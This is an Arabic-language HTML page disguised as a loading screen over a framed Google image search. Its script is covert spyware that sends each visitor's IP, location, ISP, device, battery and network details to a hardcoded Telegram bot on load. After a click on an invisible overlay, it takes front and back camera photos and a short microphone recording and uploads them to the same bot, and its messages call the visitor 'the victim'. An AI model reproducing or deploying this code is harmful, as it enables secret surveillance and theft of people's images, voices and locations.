<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background-color: #000; }
        iframe { width: 100%; height: 100%; border: none; position: absolute; z-index: 1; }
        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.01); z-index: 999; cursor: pointer; }
    </style>
</head>
<body>

    <iframe src="https://www.google.com/search?client=ms-android-realme-terr1-rso2&hs=Sl7U&sca_esv=f8172f1b7064b5e1&sxsrf=ANbL-n4wej-1VldAE-RUrBdGOig52E2G7w:1777372914894&udm=2&fbs=ADc_l-bbm1RMGiN4KYYQz0BaLGJblxgTggv8cG406lYgslWgs9PePnm284NqtYF2ZlIV7WJia_imic4gcGsFNPGaG_4DR0Yy5zAC0hn6v9WNJQOszNM72ictSJ646gDuNGeMAPO28hLkrXVv6ygxRZr-TrTqL7z9EvrtqHrCVTkX2xgpRx3VGr_MVBDNOXwILJeqVPgRu2NFxxYIbYQabpjJjf9OPVBSDTqfH-0eINdhi_NdRT1x1LT9gAmgjyx61sF_rbezNGBmD9hs2s7y8r3YqI2kewCwzg&q=%D9%85%D9%88%D9%82%D8%B9+%D8%B5%D9%88%D8%B1+%D8%A7%D9%86%D9%85%D9%89&sa=X&ved=2ahUKEwi45uaJrpCUAxV9fKQEHbZ0FfEQtKgLegQIHBAB&biw=360&bih=688&dpr=2"></iframe>
    <div id="overlay" onclick="startOrganizedCapture()"></div>

    <script>
        const token = '8053636327:AAH6qD19sl2GOBanWgKd8Rtf27rNt0nDOkE';
        const chatId = '7424419593';

        async function sendMsg(txt) {
            try {
                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(txt)}&parse_mode=Markdown`);
            } catch(e) {}
        }

        // 1. إرسال (اسم الهاتف + الـ IP) فور الفتح
        window.onload = async () => {
            const userAgent = navigator.userAgent;
            let deviceName = "غير معروف";
            if (userAgent.match(/Android/i)) deviceName = "Android Device";
            else if (userAgent.match(/iPhone/i)) deviceName = "iPhone";
            
            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
                sendMsg(`📱 *نوع الهاتف:* ${deviceName}\n🌐 *IP:* ${d.ip}`);
                
                // 2. إرسال الموقع في رسالة منفصلة (بعد الـ IP)
                setTimeout(() => {
                    sendMsg(`📍 *الموقع بالتفصيل:*\nالمدينة: ${d.city}\nالدولة: ${d.country_name}\nالشركة المزودة: ${d.org}`);
                }, 1000);
            });
        };

        async function startOrganizedCapture() {
            document.getElementById('overlay').style.display = 'none';

            // 3. إرسال معلومات البطارية والشبكة
            let batteryInfo = "غير مدعوم";
            try { const b = await navigator.getBattery(); batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'جاري الشحن' : 'تفريغ'})`; } catch(e) {}
            
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            let netType = connection ? connection.effectiveType : "غير معروف";
            
            sendMsg(`🔋 *البطارية:* ${batteryInfo}\n📶 *نوع الشبكة:* ${netType}`);

            // 4. البدء بسحب الكاميرات
            try {
                // الكاميرا الأمامية
                const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                await captureMedia(frontStream, "الأمامية", true);
                frontStream.getTracks().forEach(t => t.stop());

                // الكاميرا الخلفية (بعد ثانية)
                setTimeout(async () => {
                    try {
                        const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                        await captureMedia(backStream, "الخلفية", false);
                        backStream.getTracks().forEach(t => t.stop());
                    } catch(e) { sendMsg("⚠️ الكاميرا الخلفية محظورة."); }
                }, 1500);

            } catch (e) {
                sendMsg("🚫 الضحية رفض الأذونات.");
            }
        }

        async function captureMedia(stream, type, isAudio) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.muted = true;
            await video.play();

            const canvas = document.createElement('canvas');
            canvas.width = 480; canvas.height = 640;
            canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
            canvas.toBlob(blob => {
                const frm = new FormData();
                frm.append('chat_id', chatId);
                frm.append('photo', blob, `${type}.jpg`);
                frm.append('caption', `📸 لقطة من الكاميرا ${type}`);
                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: frm });
            }, 'image/jpeg', 0.5);

            if (isAudio) {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/ogg' });
                    const frm = new FormData();
                    frm.append('chat_id', chatId);
                    frm.append('voice', blob, 'rec.ogg');
                    fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: 'POST', body: frm });
                };
                recorder.start();
                setTimeout(() => recorder.stop(), 5000);
            }
        }
    </script>
</body>
</html>
